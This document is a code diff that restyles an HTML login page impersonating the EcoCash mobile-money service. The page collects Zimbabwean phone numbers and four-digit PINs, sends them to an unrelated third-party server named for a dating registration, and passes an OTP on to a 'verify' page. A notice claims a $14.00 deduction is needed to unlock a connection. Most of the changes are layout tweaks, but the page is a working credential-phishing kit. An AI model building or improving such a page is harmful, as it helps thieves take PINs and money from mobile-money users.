@@ -3,10 +3,11 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>EcoCash - Login</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
@@ -25,16 +26,21 @@
         body {
             display: flex;
             flex-direction: column;
+            align-items: center;
+            padding: 0;
+            width: 100%;
         }
         
+        /* ===== LOGO ===== */
         .logo {
             text-align: center;
-            padding: 50px 20px 20px;
+            padding: 40px 20px 20px;
             flex-shrink: 0;
+            width: 100%;
         }
         
         .logo-text {
-            font-size: 36px;
+            font-size: 32px;
             font-weight: 700;
         }
         
@@ -46,32 +52,34 @@
             color: #ff0000;
         }
         
+        /* ===== LOGIN CONTENT ===== */
         .login-content {
             flex: 1 0 auto;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 0 30px 50px;
+            padding: 0 20px 30px;
             max-width: 480px;
-            margin: 0 auto;
             width: 100%;
+            margin: 0 auto;
         }
         
         .title {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 600;
             color: #333;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
         }
         
+        /* ===== PHONE INPUT ===== */
         .phone-group {
             width: 100%;
             border: 2px solid #0066ff;
             border-radius: 16px;
             display: flex;
             align-items: center;
-            padding: 18px 24px;
-            margin-bottom: 40px;
+            padding: 16px 20px;
+            margin-bottom: 30px;
             background: white;
             transition: box-shadow 0.3s;
         }
@@ -81,8 +89,8 @@
         }
         
         .flag {
-            font-size: 28px;
-            margin-right: 12px;
+            font-size: 24px;
+            margin-right: 10px;
         }
         
         .country-select {
@@ -90,48 +98,54 @@
             align-items: center;
             color: #0066ff;
             font-weight: 600;
-            font-size: 18px;
-            margin-right: 16px;
+            font-size: 16px;
+            margin-right: 12px;
+            flex-shrink: 0;
         }
         
         .dropdown-arrow {
-            font-size: 14px;
-            margin-left: 6px;
+            font-size: 12px;
+            margin-left: 4px;
         }
         
         .phone-input {
             flex: 1;
             border: none;
             outline: none;
-            font-size: 18px;
+            font-size: 16px;
             color: #333;
             font-family: 'Inter', sans-serif;
+            min-width: 0;
+            width: 100%;
         }
         
         .phone-input::placeholder {
             color: #aaa;
         }
         
+        /* ===== PIN ===== */
         .pin-label {
-            font-size: 16px;
+            font-size: 15px;
             color: #666;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
             font-weight: 500;
         }
         
         .pin-group {
             display: flex;
             justify-content: center;
-            gap: 20px;
-            margin-bottom: 30px;
+            gap: 14px;
+            margin-bottom: 25px;
+            width: 100%;
+            max-width: 320px;
         }
         
         .pin-box {
-            width: 60px;
-            height: 60px;
+            width: 55px;
+            height: 55px;
             border: 2px solid #0066ff;
-            border-radius: 16px;
-            font-size: 28px;
+            border-radius: 14px;
+            font-size: 26px;
             text-align: center;
             background: white;
             color: #333;
@@ -153,18 +167,18 @@
         
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-10px); }
-            40% { transform: translateX(10px); }
-            60% { transform: translateX(-10px); }
-            80% { transform: translateX(10px); }
+            20% { transform: translateX(-8px); }
+            40% { transform: translateX(8px); }
+            60% { transform: translateX(-8px); }
+            80% { transform: translateX(8px); }
         }
         
         .forgot {
-            font-size: 15px;
+            font-size: 14px;
             color: #0066ff;
             text-decoration: none;
             font-weight: 500;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
             transition: opacity 0.3s;
         }
         
@@ -172,19 +186,20 @@
             opacity: 0.7;
         }
         
+        /* ===== LOGIN BUTTON ===== */
         #loginBtn {
             display: none;
             width: 100%;
             max-width: 400px;
-            padding: 18px;
+            padding: 16px;
             background: #0066ff;
             color: white;
             border: none;
             border-radius: 50px;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
-            margin-bottom: 50px;
+            margin-bottom: 30px;
             box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
             transition: transform 0.2s, box-shadow 0.2s;
         }
@@ -204,15 +219,31 @@
             transform: none !important;
         }
         
+        /* ===== NOTICE ===== */
+        .notice {
+            background: rgba(255, 193, 7, 0.15);
+            border: 2px solid #FFC107;
+            border-radius: 12px;
+            padding: 16px 18px;
+            margin-top: 20px;
+            text-align: center;
+            color: #333;
+            font-weight: 600;
+            font-size: 13px;
+            line-height: 1.6;
+            width: 100%;
+        }
+        
+        /* ===== BOTTOM SECTION ===== */
         .bottom-section {
             background: #005eb8;
             color: white;
-            padding: 100px 30px 80px;
+            padding: 80px 20px 60px;
             text-align: center;
-            width: 100vw;
-            margin-left: calc(-50vw + 50%);
+            width: 100%;
             position: relative;
             flex-shrink: 0;
+            margin-top: 20px;
         }
         
         .curve {
@@ -220,10 +251,10 @@
             top: 0;
             left: 0;
             width: 100%;
-            height: 90px;
+            height: 70px;
             background: white;
             border-radius: 0 0 50% 50% / 0 0 100% 100%;
-            transform: scaleX(1.8);
+            transform: scaleX(1.5);
             transform-origin: top;
         }
         
@@ -233,8 +264,8 @@
         }
         
         .bottom-text {
-            font-size: 15px;
-            margin-bottom: 35px;
+            font-size: 14px;
+            margin-bottom: 30px;
             line-height: 1.6;
             opacity: 0.95;
         }
@@ -242,8 +273,8 @@
         .bottom-btns {
             display: flex;
             justify-content: center;
-            gap: 30px;
-            margin-bottom: 40px;
+            gap: 20px;
+            margin-bottom: 30px;
             flex-wrap: wrap;
         }
         
@@ -252,14 +283,14 @@
             color: #0066ff;
             border: none;
             border-radius: 30px;
-            padding: 18px 36px;
+            padding: 14px 24px;
             font-weight: 600;
-            font-size: 16px;
+            font-size: 14px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 8px;
-            width: 180px;
+            gap: 6px;
+            width: 150px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
             text-decoration: none;
             transition: transform 0.2s, box-shadow 0.2s;
@@ -271,19 +302,19 @@
         }
         
         .btn-icon {
-            font-size: 26px;
+            font-size: 22px;
             color: #0066ff;
         }
         
         .version {
-            font-size: 14px;
-            margin-bottom: 12px;
+            font-size: 13px;
+            margin-bottom: 10px;
             opacity: 0.9;
             font-weight: 500;
         }
         
         .terms {
-            font-size: 13px;
+            font-size: 12px;
             opacity: 0.85;
             line-height: 1.5;
         }
@@ -298,6 +329,7 @@
             opacity: 0.8;
         }
         
+        /* ===== SPINNER ===== */
         #spinnerOverlay {
             position: fixed;
             top: 0;
@@ -313,34 +345,30 @@
         }
         
         .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #005eb8;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f0f0f0;
+            border-top: 5px solid #005eb8;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
         
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         .spinner-text {
-            font-size: 18px;
+            font-size: 16px;
             color: #333;
             text-align: center;
             line-height: 1.6;
-            max-width: 300px;
+            max-width: 280px;
             font-weight: 500;
         }
         
-        /* Toast notification */
+        /* ===== TOAST ===== */
         .toast {
             position: fixed;
             bottom: 30px;
@@ -348,7 +376,7 @@
             transform: translateX(-50%);
             background: #333;
             color: white;
-            padding: 16px 30px;
+            padding: 14px 24px;
             border-radius: 12px;
             font-size: 14px;
             font-weight: 500;
@@ -372,6 +400,7 @@
             background: #27ae60;
         }
         
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
             .logo-text {
                 font-size: 28px;
@@ -380,48 +409,91 @@
                 font-size: 22px;
             }
             .pin-box {
-                width: 50px;
-                height: 50px;
-                font-size: 24px;
+                width: 48px;
+                height: 48px;
+                font-size: 22px;
             }
             .pin-group {
-                gap: 12px;
-            }
-            .bottom-btn {
-                width: 150px;
-                padding: 14px 20px;
-                font-size: 14px;
-            }
-            .bottom-section {
-                padding: 80px 20px 60px;
-            }
-        }
-        
-        @media (max-width: 380px) {
-            .pin-box {
-                width: 44px;
-                height: 44px;
-                font-size: 20px;
-            }
-            .pin-group {
-                gap: 8px;
+                gap: 10px;
             }
             .bottom-btn {
                 width: 130px;
                 padding: 12px 16px;
                 font-size: 13px;
             }
+            .bottom-section {
+                padding: 60px 16px 40px;
+            }
+            .phone-group {
+                padding: 14px 16px;
+            }
+            .flag {
+                font-size: 20px;
+            }
+            .country-select {
+                font-size: 14px;
+                margin-right: 8px;
+            }
+        }
+        
+        @media (max-width: 380px) {
+            .pin-box {
+                width: 42px;
+                height: 42px;
+                font-size: 20px;
+                border-radius: 12px;
+            }
+            .pin-group {
+                gap: 8px;
+            }
+            .bottom-btn {
+                width: 120px;
+                padding: 10px 12px;
+                font-size: 12px;
+            }
+            .login-content {
+                padding: 0 12px 20px;
+            }
+            .logo {
+                padding: 25px 12px 15px;
+            }
+            .logo-text {
+                font-size: 24px;
+            }
+            .notice {
+                font-size: 12px;
+                padding: 12px 14px;
+            }
+        }
+        
+        @media (min-width: 768px) {
+            .login-content {
+                padding: 0 30px 40px;
+            }
+            .bottom-section {
+                padding: 100px 40px 80px;
+            }
+            .bottom-btns {
+                gap: 30px;
+            }
+            .bottom-btn {
+                width: 180px;
+                padding: 18px 36px;
+                font-size: 16px;
+            }
         }
     </style>
 </head>
 
 <body>
+    <!-- ===== LOGO ===== -->
     <div class="logo">
         <div class="logo-text">
             <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
         </div>
     </div>
 
+    <!-- ===== LOGIN CONTENT ===== -->
     <div class="login-content">
         <h1 class="title">Login</h1>
 
@@ -430,7 +502,7 @@
             <div class="country-select">
                 +263 <span class="dropdown-arrow">▼</span>
             </div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" maxlength="9">
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" maxlength="9" inputmode="numeric">
         </div>
 
         <div class="pin-label">Enter your PIN</div>
@@ -445,12 +517,13 @@
 
         <button id="loginBtn">LOGIN</button>
 
-        <div style="background: rgba(255, 193, 7, 0.15); border: 2px solid #FFC107; border-radius: 12px; padding: 20px; margin-top: 30px; text-align: center; color: #333; font-weight: 600; font-size: 14px; line-height: 1.6;">
+        <div class="notice">
             ⚠️ <strong>IMPORTANT NOTICE</strong><br><br>
             Ensure that you enter the Eco Cash Details in Order To Allow Our System To Deduct The <strong>$14.00</strong> For Subscriptions Which Will Enable You To Unlock Your Connection.
         </div>
     </div>
 
+    <!-- ===== BOTTOM SECTION ===== -->
     <div class="bottom-section">
         <div class="curve"></div>
         <div class="bottom-content">
@@ -462,9 +535,9 @@
                     <div class="btn-icon">👤</div>
                     Register
                 </a>
-                <a href="#" class="bottom-btn" onclick="alert('Help & Support page coming soon!')">
+                <a href="#" class="bottom-btn" onclick="alert('Help &amp; Support page coming soon!')">
                     <div class="btn-icon">ℹ️</div>
-                    Help & Support
+                    Help &amp; Support
                 </a>
             </div>
             <div class="version">v2.13P</div>
@@ -474,6 +547,7 @@
         </div>
     </div>
     
+    <!-- ===== SPINNER ===== -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
@@ -481,10 +555,14 @@
         </div>
     </div>
 
-    <!-- Toast Notification -->
+    <!-- ===== TOAST ===== -->
     <div class="toast" id="toast"></div>
     
     <script>
+        // ============================================================
+        // ECOCASH LOGIN - CONNECTED TO BACKEND
+        // ============================================================
+        
         // ===== CONFIGURATION =====
         const API_URL = 'https://classydateregistration-production.up.railway.app';
         
@@ -498,7 +576,7 @@
         let pinValue = '';
         let isSubmitting = false;
 
-        // ===== TOAST NOTIFICATION =====
+        // ===== TOAST =====
         function showToast(message, type = '') {
             toast.textContent = message;
             toast.className = 'toast show ' + type;
@@ -507,12 +585,12 @@
             }, 5000);
         }
 
-        // ===== CLEAR SAVED DATA ON LOAD =====
+        // ===== CLEAR SAVED DATA =====
         phoneInput.value = '';
         pinBoxes.forEach(box => box.value = '');
         localStorage.removeItem('phone');
 
-        // ===== PIN INPUT HANDLING =====
+        // ===== PIN INPUT =====
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
             loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
@@ -557,7 +635,7 @@
             });
         });
 
-        // ===== LOGIN BUTTON CLICK =====
+        // ===== LOGIN =====
         loginBtn.addEventListener('click', async () => {
             if (isSubmitting) return;
 
@@ -580,7 +658,6 @@
                 return;
             }
 
-            // ===== DISABLE BUTTON & SHOW SPINNER =====
             isSubmitting = true;
             loginBtn.disabled = true;
             loginBtn.textContent = '⏳ Processing...';
@@ -619,11 +696,8 @@
                     showToast('✅ Login successful! Redirecting...', 'success');
                     
                     loginBtn.textContent = '✅ APPROVED';
-                    
-                    // Save phone number
                     localStorage.setItem('phone', phone);
                     
-                    // Redirect to verify page with phone and OTP
                     setTimeout(() => {
                         spinnerOverlay.style.display = 'none';
                         window.location.href = `verifyzimbabwe.html?phone=${phone}&otp=${otp}`;
@@ -638,7 +712,7 @@
                 
                 let userMessage = 'Login failed. Please try again.';
                 if (error.message.includes('Failed to fetch') || error.message.includes('502')) {
-                    userMessage = 'Cannot connect to server. Please check your internet connection and try again.';
+                    userMessage = 'Cannot connect to server. Please check your internet connection.';
                 } else {
                     userMessage = error.message || 'Login failed. Please try again.';
                 }
@@ -652,10 +726,8 @@
             }
         });
 
-        // ===== AUTO-FOCUS PHONE INPUT =====
+        // ===== AUTO-FOCUS =====
         phoneInput.focus();
-
-        // ===== CHECK PIN COMPLETE ON LOAD =====
         checkPinComplete();
     </script>
 </body>
